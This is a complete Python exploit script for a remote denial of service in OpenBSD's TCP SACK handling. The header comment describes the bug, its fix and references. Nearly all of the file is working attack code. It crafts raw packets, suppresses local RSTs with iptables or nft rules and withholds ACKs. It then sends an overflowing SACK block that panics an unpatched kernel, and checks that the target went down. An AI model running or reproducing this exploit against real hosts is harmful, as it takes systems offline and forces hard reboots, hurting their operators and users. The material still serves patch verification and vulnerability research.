#!/usr/bin/env python3
#
#
# OpenBSD TCP SACK Remote Kernel Denial of Service
# Errata: OpenBSD 7.8 #025 / 7.7 #031 (March 25, 2026)
#
# A NULL pointer dereference in tcp_sack_option() allows a remote
# attacker to panic an unpatched OpenBSD kernel via crafted TCP SACK
# options. The vulnerability stems from missing validation of
# sack.start against snd_una and a missing NULL pointer guard in the
# SACK hole append path. Signed integer overflow in the SEQ_LT/SEQ_LEQ
# macros causes contradictory comparison results, allowing an attacker
# to delete a SACK hole (setting the list pointer to NULL) and then
# trigger the append path which dereferences the NULL pointer.
#
# Affected:  OpenBSD 7.8 (before errata #025), 7.7 (before errata #031).
#            The vulnerable code dates to approximately 1999 but
#            exploitability of older versions has not been verified.
# Fixed:     commit 0e8206e596ad in sys/netinet/tcp_input.c
# Severity:  Remote DoS (kernel panic, requires hard reboot)
# Auth:      None — any TCP connection suffices
#
# References:
#   https://www.openbsd.org/errata78.html (entry #025)
#   https://github.com/openbsd/src/commit/0e8206e596add74fef1653b4472de6b3723c435f
#
# Requirements:
#   - Root privileges (raw sockets and firewall manipulation)
#   - Linux attack host (raw socket IP_HDRINCL behavior assumed)
#   - Direct L2/L3 path to target (not through a TCP proxy or NAT)
#   - Target must be running unpatched OpenBSD with TCP SACK enabled
#   - Target must have at least one listening TCP service
#
# Limitations:
#   - Does NOT work through QEMU user-mode NAT (use TAP/bridge)
#   - Does NOT affect non-OpenBSD systems
#   - Patched systems silently drop the crafted SACK
#   - IPv4 only
#
# Usage:
#   python3 poc_sack.py <target_ip> [target_port]
#

import argparse
import atexit
import os
import socket
import struct
import subprocess
import sys
import time


# ---------------------------------------------------------------------------
# TCP constants
# ---------------------------------------------------------------------------

TCP_SYN     = 0x02
TCP_ACK     = 0x10
TCP_PSH_ACK = 0x18
TCP_SYN_ACK = 0x12


# ---------------------------------------------------------------------------
# Packet construction
# ---------------------------------------------------------------------------

def _ones_complement_sum(data):
    """RFC 1071 ones-complement checksum over a byte buffer."""
    if len(data) % 2:
        data += b'\x00'
    total = sum(struct.unpack('!%dH' % (len(data) // 2), data))
    total = (total >> 16) + (total & 0xffff)
    total += total >> 16
    return ~total & 0xffff


def build_tcp_segment(src_ip, dst_ip, src_port, dst_port,
                      seq, ack, flags, options=b'', payload=b''):
    """Build a TCP segment with correct checksum.

    Returns the complete TCP segment (header + options + payload) and
    the computed checksum. Does not include the IP header.
    """
    # Pad options to 4-byte boundary with NOP (kind=1).
    while len(options) % 4:
        options += b'\x01'

    header_len = 20 + len(options)
    data_offset = (header_len // 4) << 4

    # Assemble with zero checksum for computation.
    header = struct.pack(
        '!HHIIBBHHH',
        src_port, dst_port,
        seq & 0xFFFFFFFF, ack & 0xFFFFFFFF,
        data_offset, flags,
        32768,  # window
        0,      # checksum (placeholder)
        0,      # urgent pointer
    )
    segment = header + options + payload

    pseudo_header = struct.pack(
        '!4s4sBBH',
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
        0, 6, len(segment),
    )
    csum = _ones_complement_sum(pseudo_header + segment)

    # Rebuild with computed checksum.
    header = struct.pack(
        '!HHIIBBHHH',
        src_port, dst_port,
        seq & 0xFFFFFFFF, ack & 0xFFFFFFFF,
        data_offset, flags,
        32768, csum, 0,
    )
    return header + options + payload


def build_ip_packet(src_ip, dst_ip, tcp_segment):
    """Wrap a TCP segment in an IPv4 header.

    The IP checksum field is left zero; the Linux kernel fills it
    when sending via IPPROTO_RAW with IP_HDRINCL.
    """
    total_len = 20 + len(tcp_segment)
    return struct.pack(
        '!BBHHHBBH4s4s',
        0x45, 0, total_len,
        54321, 0x4000,
        64, 6, 0,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
    ) + tcp_segment


def build_packet(src_ip, dst_ip, src_port, dst_port,
                 seq, ack, flags, options=b'', payload=b''):
    """Construct a complete raw IP+TCP packet."""
    seg = build_tcp_segment(src_ip, dst_ip, src_port, dst_port,
                            seq, ack, flags, options, payload)
    return build_ip_packet(src_ip, dst_ip, seg)


def encode_sack_option(blocks):
    """Encode SACK blocks as a TCP option (kind=5).

    Each block is a (start, end) tuple of 32-bit sequence numbers.
    """
    data = b''.join(
        struct.pack('!II', s & 0xFFFFFFFF, e & 0xFFFFFFFF)
        for s, e in blocks
    )
    return struct.pack('BB', 5, 2 + len(data)) + data


def encode_syn_options():
    """MSS 1460 + SACK-Permitted, NOP-padded to 4 bytes."""
    mss = struct.pack('!BBH', 2, 4, 1460)
    sack_ok = b'\x04\x02'
    return mss + sack_ok + b'\x01\x01'


# ---------------------------------------------------------------------------
# Raw socket receive
# ---------------------------------------------------------------------------

def receive_tcp(raw_sock, expected_src, expected_sport, local_port,
                timeout=5.0):
    """Block until a matching TCP packet arrives or timeout.

    Returns (seq, ack, flags, payload, window) or None.
    Only matches packets from expected_src:expected_sport to local_port.
    """
    deadline = time.monotonic() + timeout
    while True:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            return None
        try:
            raw_sock.settimeout(max(0.05, remaining))
            data, _ = raw_sock.recvfrom(65535)
        except socket.timeout:
            return None

        if len(data) < 40:
            continue
        ihl = (data[0] & 0x0F) * 4
        if socket.inet_ntoa(data[12:16]) != expected_src:
            continue

        tcp = data[ihl:]
        if len(tcp) < 20:
            continue
        sport, dport, seq, ack = struct.unpack('!HHII', tcp[:12])
        if dport != local_port or sport != expected_sport:
            continue

        flags = tcp[13]
        window = struct.unpack('!H', tcp[14:16])[0]
        thlen = ((tcp[12] >> 4) & 0xF) * 4
        payload = tcp[thlen:]
        return (seq, ack, flags, payload, window)


def flush_recv_buffer(sock):
    """Drain stale packets from a raw socket."""
    sock.settimeout(0.05)
    try:
        while True:
            sock.recvfrom(65535)
    except socket.timeout:
        pass


# ---------------------------------------------------------------------------
# Firewall rule management
# ---------------------------------------------------------------------------

class FirewallRule:
    """Context manager for RST suppression rules.

    Ensures cleanup even on exceptions or early exits.
    """

    def __init__(self, target):
        self.target = target
        self.method = None   # 'iptables' or 'nft'
        self.binary = None   # path to iptables binary
        self.active = False

    def _find_iptables(self):
        for name in ['iptables', 'iptables-legacy',
                     '/usr/sbin/iptables', '/sbin/iptables']:
            try:
                r = subprocess.run([name, '--version'],
                                  capture_output=True, timeout=3)
                if r.returncode == 0:
                    return name
            except (FileNotFoundError, subprocess.TimeoutExpired):
                continue
        return None

    def _has_nft(self):
        for name in ['nft', '/usr/sbin/nft']:
            try:
                r = subprocess.run([name, '--version'],
                                  capture_output=True, timeout=3)
                if r.returncode == 0:
                    return True
            except (FileNotFoundError, subprocess.TimeoutExpired):
                continue
        return False

    def check(self):
        """Return True if an RST suppression rule already exists."""
        ipt = self._find_iptables()
        if ipt:
            try:
                r = subprocess.run(
                    [ipt, '-C', 'OUTPUT', '-p', 'tcp',
                     '--tcp-flags', 'RST', 'RST',
                     '-d', self.target, '-j', 'DROP'],
                    capture_output=True, timeout=3)
                if r.returncode == 0:
                    return True
            except (FileNotFoundError, subprocess.TimeoutExpired):
                pass

        try:
            r = subprocess.run(['nft', 'list', 'table', 'ip', 'sack_poc'],
                              capture_output=True, text=True, timeout=3)
            if r.returncode == 0 and self.target in r.stdout:
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        return False

    def add(self):
        """Add RST suppression. Returns True on success."""
        ipt = self._find_iptables()
        if ipt:
            r = subprocess.run(
                [ipt, '-A', 'OUTPUT', '-p', 'tcp',
                 '--tcp-flags', 'RST', 'RST',
                 '-d', self.target, '-j', 'DROP'],
                capture_output=True, text=True)
            if r.returncode == 0:
                self.method = 'iptables'
                self.binary = ipt
                self.active = True
                return True

        if self._has_nft():
            script = (
                f'table ip sack_poc {{\n'
                f'  chain output {{\n'
                f'    type filter hook output priority -300; policy accept;\n'
                f'    tcp flags rst ip daddr {self.target} drop\n'
                f'  }}\n'
                f'}}\n'
            )
            r = subprocess.run(['nft', '-f', '-'], input=script,
                              capture_output=True, text=True)
            if r.returncode == 0:
                self.method = 'nft'
                self.active = True
                return True

        return False

    def remove(self):
        """Remove RST suppression rule if we added one."""
        if not self.active:
            return
        if self.method == 'iptables':
            subprocess.run(
                [self.binary, '-D', 'OUTPUT', '-p', 'tcp',
                 '--tcp-flags', 'RST', 'RST',
                 '-d', self.target, '-j', 'DROP'],
                capture_output=True)
        elif self.method == 'nft':
            subprocess.run(['nft', 'delete', 'table', 'ip', 'sack_poc'],
                          capture_output=True)
        self.active = False

    def __enter__(self):
        return self

    def __exit__(self, *_):
        self.remove()


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def detect_local_ip(target):
    """Determine which local IP routes to the target."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 1))
        return s.getsockname()[0]
    finally:
        s.close()


def is_host_alive(target, timeout=3):
    """Probe whether host responds to ICMP echo."""
    try:
        r = subprocess.run(
            ['ping', '-c', '1', '-W', str(timeout), target],
            capture_output=True, text=True, timeout=timeout + 2)
        return '1 received' in r.stdout
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return False


# ---------------------------------------------------------------------------
# Exploit
# ---------------------------------------------------------------------------

def exploit(target, port):
    """Execute the SACK crash against the target.

    Returns True if the target appears to have crashed.
    """
    # Resolve local address and pick an ephemeral source port.
    local_ip = detect_local_ip(target)
    local_port = 40000 + int(time.time() * 1000) % 20000

    print(f'[*] OpenBSD SACK Remote Kernel DoS (Errata #025)')
    print(f'[*] Target:  {target}:{port}')
    print(f'[*] Source:  {local_ip}:{local_port}')
    print()

    # --- Preflight: RST suppression ---
    # The local kernel will RST our raw-socket TCP connection unless
    # outgoing RSTs to the target are suppressed.  This is because the
    # kernel sees a SYN-ACK for a connection it never opened and sends
    # RST, tearing down the connection before we can accumulate
    # unacknowledged server data.

    fw = FirewallRule(target)
    atexit.register(fw.remove)  # safety net for unclean exits

    if not fw.check():
        print('[!] No RST suppression rule detected.')
        print('    The local kernel will RST our raw TCP connection,')
        print('    preventing the exploit from accumulating unacked data.')
        print()
        print('    NOTE: This exploit ONLY affects OpenBSD.')
        print()
        try:
            answer = input('    Add rule automatically? [y/N] ').strip()
        except (EOFError, KeyboardInterrupt):
            answer = ''
        if answer.lower() != 'y':
            print('    Aborting.')
            return False
        if not fw.add():
            print(f'    [-] Failed to add rule (tried iptables and nft).')
            print(f'    Add manually:')
            print(f'      iptables -A OUTPUT -p tcp '
                  f'--tcp-flags RST RST -d {target} -j DROP')
            return False
        print(f'    [+] RST rule added via {fw.method} '
              f'(removed on exit).')
        print()

    # --- Open raw sockets ---
    send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                              socket.IPPROTO_RAW)
    send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                              socket.IPPROTO_TCP)
    flush_recv_buffer(recv_sock)

    try:
        return _run_exploit(send_sock, recv_sock, fw,
                            local_ip, local_port, target, port)
    finally:
        send_sock.close()
        recv_sock.close()
        fw.remove()


def _run_exploit(send_sock, recv_sock, fw,
                 local_ip, local_port, target, port):
    """Core exploit logic, separated for clean resource management."""

    def send(pkt):
        send_sock.sendto(pkt, (target, 0))

    def recv(timeout=5.0):
        return receive_tcp(recv_sock, target, port, local_port, timeout)

    # ------------------------------------------------------------------
    # Phase 1 — TCP handshake via raw sockets
    # ------------------------------------------------------------------
    # We perform the handshake ourselves rather than using a kernel
    # socket so that we control ACK behavior.  The kernel never learns
    # about this connection, so it cannot send automatic ACKs for
    # server data, which is essential for the exploit.

    print('[1] Establishing TCP connection...')
    send(build_packet(local_ip, target, local_port, port,
                      100000, 0, TCP_SYN, options=encode_syn_options()))

    resp = recv()
    if resp is None or resp[2] != TCP_SYN_ACK:
        print('    [-] No SYN-ACK received.')
        if resp is not None:
            print(f'        Got flags=0x{resp[2]:02x} instead of SYN-ACK.')
        print('        Check: target up? port open? RSTs blocked?')
        return False

    server_isn, our_seq = resp[0], resp[1]
    snd_una = (server_isn + 1) & 0xFFFFFFFF
    window = resp[4]

    # Heuristic OS check: OpenBSD SYN-ACK window is typically 16384.
    if window != 16384:
        print(f'    [!] SYN-ACK window={window} (OpenBSD uses 16384).')
        print(f'        Target may not be OpenBSD.')
        print()

    # Complete three-way handshake.
    send(build_packet(local_ip, target, local_port, port,
                      our_seq, snd_una, TCP_ACK))
    print(f'    [+] Connected (server ISN={server_isn}).')

    # ------------------------------------------------------------------
    # Phase 2 — Accumulate unacknowledged server data
    # ------------------------------------------------------------------
    # The server must have snd_max > snd_una for SACK holes to exist.
    # We receive the banner, ACK it, then send a client greeting to
    # trigger additional server data (SSH KEX_INIT, HTTP response, etc.)
    # which we intentionally do NOT acknowledge.

    print('[2] Accumulating unacknowledged server data...')

    resp = recv(timeout=3.0)
    if resp is not None and len(resp[3]) > 0:
        data_end = (resp[0] + len(resp[3])) & 0xFFFFFFFF
        snd_una = data_end
        print(f'    [+] Banner: {resp[3][:40]}')

    # Acknowledge the banner and send a greeting.
    if port == 22:
        greeting = b'SSH-2.0-OpenSSH_9.9\r\n'
    else:
        greeting = b'GET / HTTP/1.0\r\nHost: target\r\n\r\n'

    send(build_packet(local_ip, target, local_port, port,
                      our_seq, snd_una, TCP_PSH_ACK, payload=greeting))
    our_seq = (our_seq + len(greeting)) & 0xFFFFFFFF

    # Collect server response data without acknowledging.
    time.sleep(2)
    snd_max = snd_una
    for _ in range(20):
        resp = recv(timeout=1.0)
        if resp is None:
            break
        if len(resp[3]) > 0:
            end = (resp[0] + len(resp[3])) & 0xFFFFFFFF
            # Accept only forward-moving sequence numbers.
            if ((end - snd_una) & 0xFFFFFFFF) < 0x80000000:
                if ((end - snd_max) & 0xFFFFFFFF) < 0x80000000:
                    snd_max = end

    unacked = (snd_max - snd_una) & 0xFFFFFFFF
    print(f'    [+] Unacked: {unacked} bytes '
          f'(snd_una={snd_una}, snd_max={snd_max}).')

    if unacked < 400:
        print('    [-] Insufficient unacked data (need >= 400).')
        print('        Most likely cause: RST rule not in place.')
        return False

    # ------------------------------------------------------------------
    # Phase 3 — Send the crash packet
    # ------------------------------------------------------------------
    #
    # One TCP segment carrying two SACK blocks:
    #
    # Block 1 (normal): [snd_una+346, snd_una+546]
    #   Creates hole [snd_una, snd_una+346].
    #   Sets rcv_lastsack = snd_una+546.
    #
    # Block 2 (overflow): [snd_una+0x80000190, snd_una+399]
    #   start = snd_una + 2^31 + 400.  Due to signed overflow in
    #   SEQ_LEQ, this appears <= hole.start, triggering deletion
    #   (p = NULL).  The same overflow makes SEQ_LT(rcv_lastsack,
    #   start) true, triggering the append path.  The append
    #   dereferences p->next — NULL — and the kernel panics.
    #
    #   end = snd_una + 399, which is within [snd_una, snd_max]
    #   and passes all validation checks.  The vulnerable code
    #   does not validate sack.start >= snd_una.

    print('[3] Sending crash packet...')

    block_normal = (
        (snd_una + 346) & 0xFFFFFFFF,
        (snd_una + 546) & 0xFFFFFFFF,
    )
    block_overflow = (
        (snd_una + 0x80000000 + 400) & 0xFFFFFFFF,
        (snd_una + 399) & 0xFFFFFFFF,
    )

    sack = encode_sack_option([block_normal, block_overflow])
    send(build_packet(local_ip, target, local_port, port,
                      our_seq, snd_una, TCP_ACK, options=sack))

    print(f'    [+] Sent.')
    print(f'        Block 1: [{block_normal[0]}, {block_normal[1]}]')
    print(f'        Block 2: [0x{block_overflow[0]:08x}, {block_overflow[1]}]')

    # ------------------------------------------------------------------
    # Phase 4 — Verify crash
    # ------------------------------------------------------------------

    print('[4] Verifying...')
    time.sleep(3)

    try:
        probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        probe.settimeout(5)
        probe.connect((target, port))
        probe.close()
        print('    [-] Target is responsive — not crashed.')
        print('        Target may be patched, not OpenBSD, or SACK disabled.')
        return False
    except OSError:
        pass

    if is_host_alive(target):
        print('    [?] TCP refused but host pings — service crash, not kernel.')
        return False

    print('    [!] Target unresponsive — kernel panic.')
    return True


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description='OpenBSD TCP SACK Remote Kernel DoS (Errata #025)',
        epilog=(
            'This exploit only affects unpatched OpenBSD systems. '
            'Patch detection: syspatch -l | grep 025_sack'
        ),
    )
    parser.add_argument('target', help='Target IPv4 address')
    parser.add_argument('port', nargs='?', type=int, default=22,
                        help='Target TCP port (default: 22)')
    args = parser.parse_args()

    # Basic input validation.
    try:
        socket.inet_aton(args.target)
    except OSError:
        parser.error(f'Invalid IPv4 address: {args.target}')
    if not (1 <= args.port <= 65535):
        parser.error(f'Invalid port: {args.port}')

    # Privilege check.
    if os.geteuid() != 0:
        parser.error('Root privileges required (raw sockets).')

    crashed = exploit(args.target, args.port)

    if crashed:
        print()
        print('[*] Kernel panic confirmed. Target requires hard reboot.')
        print('[*] Fix: syspatch (installs errata #025)')

    return 0 if crashed else 1


if __name__ == '__main__':
    sys.exit(main())
